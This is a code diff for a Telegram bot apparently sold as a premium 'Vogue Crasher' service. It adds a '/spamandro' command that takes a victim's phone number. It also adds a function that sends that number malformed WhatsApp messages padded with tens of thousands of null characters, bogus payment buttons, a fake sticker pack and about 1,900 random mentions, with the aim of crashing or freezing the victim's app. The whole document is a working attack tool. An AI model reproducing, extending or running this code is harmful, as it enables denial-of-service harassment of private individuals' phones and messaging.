@@ -5050,6 +5050,82 @@ Please verify the target input and system status before retrying.`
     }
 });
 
+bot.command('spamandro', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+\`\`\`ruby
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+Description : Android Delay Invisible
+
+──────────────────────────
+\`\`\``,
+            parse_mode: "markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 2; i++) {
+                try {
+                    await PriasoloFcXcrashIos(sock, target);
+                    await sleep(1500)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    await restartBot("Connection Closed");
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+        await restartBot("Connection Closed");
+    }
+});
+
 bot.command('spamiphone', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -5872,6 +5948,319 @@ async function VogueHardInvis(sock, target) {
         participant: { jid: target },
         messageId: msg.key.id
     });
+}
+
+async function PriasoloFcXcrashIos(sock, target) {
+  try {
+    const msg = await generateWAMessage(
+      target,
+      {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage:
+              proto.Message.InteractiveMessage.create({
+                body: {
+                  text:
+                    "\u0000".repeat(10000)
+                },
+                footer: {
+                  text:
+                    "\u0000".repeat(10000)
+                },
+                header: {
+                  title:
+                    "NativeFlow".repeat(10000),
+                  subtitle:
+                    "iOS".repeat(10000),
+                  hasMediaAttachment: false
+                },
+                contextInfo: {
+                  externalAdReply: {
+                    title:
+                      "Preview".repeat(10000),
+                    body:
+                      "externalAdReply".repeat(10000),
+                    mediaType: 1,
+                    renderLargerThumbnail: true,
+                    sourceUrl:
+                      "https://t.me/makluyatiemk"
+                  }
+                },
+                nativeFlowMessage: {
+                  buttons: [
+                    {
+                      name:
+                        "quick_reply",
+                      buttonParamsJson:
+                        JSON.stringify({
+                          display_text:
+                            "\u0000".repeat(10000),
+                          id:
+                            ".menu"
+                        })
+                    },
+                    {
+                      name:
+                        "payment_key_info",
+                      buttonParamsJson:
+                        JSON.stringify({
+                          currency:
+                            "IDR",
+                          amount:
+                            9999999,
+                          receiver:
+                            target,
+                          note:
+                            "PAY".repeat(5000)
+                        })
+                    }
+                  ]
+                }
+              })
+
+          }
+        }
+      },
+      {
+        upload:
+          sock.waUploadToServer
+      }
+    )
+const MatiKau = JSON.stringify({
+    action: "PriaSolo",
+    data: "Narzsukatobrut"
+  });
+  await sock.relayMessage(target, {
+    stickerPackMessage: {
+      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
+      name: "Pria solo anti tumbang" + "\u0000" + "\u0000".repeat(15000),
+      publisher: "Paket Function Fc Click",
+      stickers: [{
+          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
+          isAnimated: false,
+          emojis: ["🦠"],
+          accessibilityLabel: "",
+          isLottie: false,
+          mimetype: "image/webp"
+        },
+        {
+          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
+          isAnimated: false,
+          emojis: ["😋"],
+          accessibilityLabel: "",
+          isLottie: false,
+          mimetype: "image/webp"
+        },
+        {
+          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
+          isAnimated: false,
+          emojis: ["🥶"],
+          accessibilityLabel: "",
+          isLottie: false,
+          mimetype: "image/webp"
+        },
+        {
+          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
+          isAnimated: false,
+          emojis: ["🤘"],
+          accessibilityLabel: "",
+          isLottie: false,
+          mimetype: "image/webp"
+        },
+        {
+          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
+          isAnimated: false,
+          emojis: ["🤙"],
+          accessibilityLabel: "",
+          isLottie: false,
+          mimetype: "image/webp"
+        },
+        {
+          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
+          isAnimated: false,
+          emojis: ["😝"],
+          accessibilityLabel: "Jawa Jawa",
+          isLottie: false,
+          mimetype: "image/webp"
+        },
+        {
+          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
+          isAnimated: false,
+          emojis: ["🧐"],
+          accessibilityLabel: "",
+          isLottie: false,
+          mimetype: "image/webp"
+        },
+        {
+          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
+          isAnimated: false,
+          emojis: ["🖕"],
+          accessibilityLabel: "",
+          isLottie: false,
+          mimetype: "image/webp"
+        }
+      ],
+      fileLength: "3662919",
+      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
+      contextInfo: {
+        remoteJid: "X",
+        participant: "0@s.whatsapp.net",
+        stanzaId: "1234567890ABCDEF",
+        mentionedJid: [
+          "628521558@s.whatsapp.net",
+          ...Array.from({
+            length: 1900
+          }, () =>
+            `1${Math.floor(Math.random() * 50000000)}@s.whatsapp.net`
+          )
+        ]
+      },
+      packDescription: "",
+      mediaKeyTimestamp: "1747502082",
+      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
+      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
+      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
+      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
+      thumbnailHeight: 252,
+      thumbnailWidth: 252,
+      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
+      stickerPackSize: "3680054",
+      stickerPackOrigin: "USER_CREATED",
+      quotedMessage: {
+        callLogMessage: {
+          isVideo: true,
+          callOutcome: "REJECTED",
+          durationSecs: "1",
+          callType: "SCHEDULED_CALL",
+          participants: [{
+              jid: target,
+              callOutcome: "CONNECTED"
+            },
+            {
+            jid: "0@s.whatsapp.net",
+           callOutcome: "REJECTED"
+            },
+            {
+              target: "0@s.whatsapp.net",
+              callOutcome: "ACCEPTED_ELSEWHERE"
+            },
+            {
+              target: "status@broadcast",
+              callOutcome: "SILENCED_UNKNOWN_CALLER"
+            },
+          ]
+        }
+      },
+    }
+  }, {});
+  
+  const Message = await generateWAMessageFromContent(target, {
+    ephemeralMessage: {
+      expiration: 3600,
+      message: {
+        viewOnceMessage: {
+          message: {
+            requestPaymentMessage: {
+              amount: {
+                value: 1,
+                offset: 0,
+                currencyCodeIso4217: "IDR",
+              },
+              requestFrom: target,
+              expiryTimestamp: Date.now(),
+              contextInfo: {
+                forwardingScore: 9999,
+                isForwarded: true,
+                fromMe: false,
+                quotedMessage: {
+                  paymentInviteMessage: {
+                    serviceType: 1,
+                    expiryTimestamp: Math.floor(Date.now() / 1000) + 60
+                  }
+                },
+                externalAdReply: {
+                  title: "🦠",
+                  body: "🔥",
+                  mediaType: 1,
+                  renderLargerThumbnail: false,
+                  nativeFlowButtons: [{
+                      name: "payment_info",
+                      buttonParamsJson: MatiKau
+                    },
+                    {
+                      name: "call_permission_request",
+                      buttonParamsJson: MatiKau
+                    },
+                    {
+                    name: "galaxy_message", 
+                    buttonParamsJson: MatiKau
+                    },
+                    {
+                      name: "send_location",
+                      buttonParamsJson: MatiKau
+                    },
+                    {
+                      name: "address_message",
+                      buttonParamsJson: MatiKau
+                    },
+                    {
+                      name: "quick_reply",
+                      buttonParamsJson: MatiKau
+                    },
+                    {
+                      name: "payment_settings",buttonParamsJson: MatiKau
+                    },
+                    {
+                      name: "payment_method", buttonParamsJson: MatiKau
+                    },
+                  ],
+                },
+                extendedTextMessage: {
+                  text: "\u0000".repeat(40000) + "\u0000".repeat(35000),
+                  contextInfo: {
+                    stanzaId: target,
+                    participant: target,
+                    quotedMessage: {
+                      conversation: "By pria solo" + "\u0000".repeat(30000) + "\u0000".repeat(20000) + "\u0000".repeat(10000),
+                    },
+                    disappearingMode: {
+                      initiator: "CHANGED_IN_CHAT",
+                      trigger: "CHAT_SETTING",
+                    },
+                  },
+                  inviteLinkGroupTypeV2: "DEFAULT",
+                },
+                participant: target,
+              }
+            }
+          }
+        }
+      }
+    }
+  }, {
+    userJid: sock.user.id,
+    quoted: null
+  });  
+    await sock.relayMessage(
+      target,
+      msg.message,
+      {
+        messageId:
+          msg.key.id
+      }
+    )
+    console.log(
+      "✅ Success send"
+    )
+  } catch (e) {
+    console.log(
+      "❌ Error:",
+      e
+    )
+  }
 }
 
 
